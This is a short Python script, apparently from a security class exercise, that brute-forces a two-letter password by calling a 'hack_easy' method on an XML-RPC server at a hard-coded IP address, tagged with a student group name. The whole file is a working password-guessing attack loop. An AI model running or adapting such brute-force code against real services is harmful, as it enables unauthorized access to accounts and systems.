from itertools import product
from string import ascii_lowercase
import xmlrpc.client

# Generates a list of all possible two-character combinations of
# lowercase ascii letters
combinations = [''.join(i) for i in product(ascii_lowercase, repeat = 2)]

#s = xmlrpc.client.ServerProxy('http://128.39.145.79:8080')
#print(s)

# For each combination in the list
for combination in combinations:
    try:
        print("\nTrying ", combination)
        # Create connection
        s = xmlrpc.client.ServerProxy('http://128.39.145.79:8080')

        # Run the hack_easy method from the connection, with the current
        # combination as password
        success = s.hack_easy(combination, "whiterose, group3")

        if (success!='success'):
            print("Try again")
        else:
            print("Great success! The correct password was", combination)
            break # End the loop, we found the correct password
    except Exception as e:
        print(e)
        print("An error occurred. Please check the connection")
        pass
